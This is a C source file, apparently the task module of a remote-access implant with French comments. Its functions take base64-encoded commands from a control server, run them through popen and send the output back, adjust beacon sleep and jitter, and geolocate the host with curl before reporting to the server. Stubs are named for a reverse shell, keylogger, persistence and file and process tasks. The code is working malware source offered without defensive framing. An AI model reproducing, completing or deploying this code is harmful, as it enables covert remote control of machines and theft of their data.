#define _POSIX_C_SOURCE 200809L

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include "base64.h"
#include "client.h"
#include "tasks.h"
#include "network.h"

// Server information
extern const char* server_ip;
extern const int server_port;

void task_execve(char *command_str, char *argument_str, const char *id_task) {
    
    // Decoding command and argument
    char *command = decode(command_str);
    char *argument = NULL;
    
    if (argument_str != NULL) {
        argument = decode(argument_str);
    }
    
    // String concatenation with bounds checking
    char full_command[4096] = {0};
    if (command != NULL) {
        if (argument != NULL) {
            snprintf(full_command, sizeof(full_command), "%s %s", command, argument);
        } else {
            snprintf(full_command, sizeof(full_command), "%s", command);
        }
    } else {
        if (argument) free(argument);
        return;
    }
    
    
    // Execute the command and capture output
    char result_buffer[4096] = {0};
    FILE *fp = popen(full_command, "r");
    if (fp == NULL) {
        free(command);
        if (argument) free(argument);
        return;
    }
    
    // Read output
    char buffer[1024];
    while (fgets(buffer, sizeof(buffer), fp) != NULL) {
        strncat(result_buffer, buffer, sizeof(result_buffer) - strlen(result_buffer) - 1);
    }
    pclose(fp);
    
    // Send the result back to the server
    if (strlen(result_buffer) > 0) {
        // Encoding the result
        char *encoded_result = encode(result_buffer);
        
        // Building the message
        char message[4096];
        snprintf(message, sizeof(message), "RESULT,%s,%s,%s", uid, id_task, encoded_result);
        
        // Send the result to the server
        char *response = send_server_message(message, server_ip, server_port);
        
        if (response != NULL) {
            free(response);
        } 
        free(encoded_result);
    } 
    free(command);
    if (argument) free(argument);
}

void task_sleep(char *sleep_time_str, char *jitter_str) {
    
    if (sleep_time_str != NULL) {
        char *decoded_sleep = decode(sleep_time_str);
        if (decoded_sleep != NULL) {
            sleep_time = atof(decoded_sleep);
            free(decoded_sleep);
        }
    }

    if (jitter_str != NULL) {
        char *decoded_jitter = decode(jitter_str);
        if (decoded_jitter != NULL) {
            jitter = atof(decoded_jitter);
            printf("Jitter: %.2f%%\n", jitter);
            free(decoded_jitter);
        }
    }
    
    return;
}

void task_locate(const char *id_task) {

    char result_buffer[4096] = {0};

    // Get localization info with curl CHANGE LE MODE
    FILE *fp = popen("curl -s ipinfo.io", "r");
    if (fp == NULL) {
        perror("Erreur lors de l'exécution de curl");
        return;
    }

    char buffer[1024];
    while (fgets(buffer, sizeof(buffer), fp) != NULL) {
        strncat(result_buffer, buffer, sizeof(result_buffer) - strlen(result_buffer) - 1);
    }
    pclose(fp);

    // Encode the result
    char *encoded_result = encode(result_buffer);
    if (encoded_result == NULL) {
        printf("Erreur d'encodage en base64\n");
        return;
    }

    // Building the message
    char message[4096];
    snprintf(message, sizeof(message), "RESULT,%s,%s,%s", uid, id_task, encoded_result);
    
    // Send the result to the server
    char *response = send_server_message(message, server_ip, server_port);
    
    if (response != NULL) {
        free(response);
    } else {
        printf("Échec de l'envoi du résultat au serveur\n");
    }

    // Free memory
    free(encoded_result);
}

void task_revshell() {
    printf("Exécution de la tâche revshell\n");
    // Implémentation à faire
    return;
}

void task_keylog() {
    printf("Exécution de la tâche keylog\n");
    // Implémentation à faire
    return;
}

void task_persist() {
    printf("Exécution de la tâche persist\n");
    // Implémentation à faire
    return;
}

void task_cat() {
    printf("Exécution de la tâche cat\n");
    // Implémentation à faire
    return;
}

void task_mv() {
    printf("Exécution de la tâche mv\n");
    // Implémentation à faire
    return;
}

void task_rm() {
    printf("Exécution de la tâche rm\n");
    // Implémentation à faire
    return;
}

void task_ps() {
    printf("Exécution de la tâche ps\n");
    // Implémentation à faire
    return;
}

void task_netstat() {
    printf("Exécution de la tâche netstat\n");
    // Implémentation à faire
    return;
}
